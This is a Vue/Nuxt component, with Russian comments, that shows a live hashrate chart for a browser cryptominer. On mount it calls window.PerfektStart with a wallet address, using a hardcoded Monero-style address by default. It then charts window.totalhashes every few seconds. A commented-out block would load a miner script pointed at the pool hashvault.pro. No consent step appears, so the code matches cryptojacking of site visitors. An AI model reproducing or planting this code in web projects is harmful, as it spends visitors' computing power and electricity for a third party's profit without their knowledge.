<template>
  <ClientOnly>
    <div class="card">
      <div class="card-body">
        <ApexChart type="line"  :options="chartOptions" :series="series" />
      </div>
    </div>
  </ClientOnly>

</template>

<script setup>

import { useAltyn } from '@/composables/useAltyn';

const { wallet, totalhashes, hashesPerSecond } = useAltyn(); // Подключаем композабле



import { useHead } from '#imports';
import { ref, onMounted } from "vue";

//const wallet = ref("");
const lastRate = ref(0);
//const totalhashes = ref(0);
//const hashesPerSecond = ref(0);
//const totalhashes = window.totalhashes;
const loadWallet = () => {
  if (typeof window !== "undefined" && window.localStorage) {
    wallet.value = localStorage.getItem("wallet") || 
      "4BCMDQB1dZV9KN9ZYo4RH3cHTAL9jUocL474pnSDaRJoeUndmWqc8KefKUoFRnczupixisqBy1uiqQES2oSgF9594vrt3St";
  }
};

onMounted(loadWallet);

/*

useHead({
  script: [
    {
      src: `/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443`,
      async: true
    }
  ]
});

*/

 
import ApexChart from "vue3-apexcharts";

const series = ref([{ name: "Хешрейт", data: [] }]);
const chartOptions = ref({
  chart: { type: "line", height: 240, animations: { enabled: true } },
  stroke: { width: 2, curve: "smooth" },
  xaxis: { type: "datetime" ,
  labels: { show: false }, // Скрыть метки на оси X
  axisBorder: { show: false }, // Скрыть границу оси X
  axisTicks: { show: false },  // Скрыть делители на оси X
  },
  labels: { show: false }, // Скрыть метки на оси X
  axisBorder: { show: false }, // Скрыть границу оси X
  axisTicks: { show: false },  // Скрыть делители на оси X
  yaxis: { labels: { padding: 4 } },

  tooltip: {
  enabled: false
  },

  axisBorder: { show: false }, // Отключаем границу оси
  axisTicks: { show: false },  // Отключаем делители
  grid: { show: false }  ,     // Отключаем сетку



  colors: ["#066fd1"]
});

onMounted(() => {
  if (window.PerfektStart) {
    window.PerfektStart(wallet.value, "OG", 2);
  }

  let lastTotalHashes = window.totalhashes || 0;
  let lastrate = 0;

  setInterval(() => {

 totalhashes.value = window.totalhashes

  let currentTotalHashes = window.totalhashes || 0;
  let diff = currentTotalHashes - lastTotalHashes;
  lastTotalHashes = currentTotalHashes;

  lastrate = (diff * 0.5) + (lastrate * 0.5);
  //hashesPerSecond.value = Math.round(lastrate * 10); // Скорость
  hashesPerSecond.value = (lastrate).toFixed(2);

  // Добавляем скорость в график
  const now = new Date().getTime();
  series.value[0].data.push([now, hashesPerSecond.value]);

  if (series.value[0].data.length > 20) {
    series.value[0].data.shift(); // Убираем старые точки
  }
}, 5000); // Обновляем каждые 3сек

});




</script>



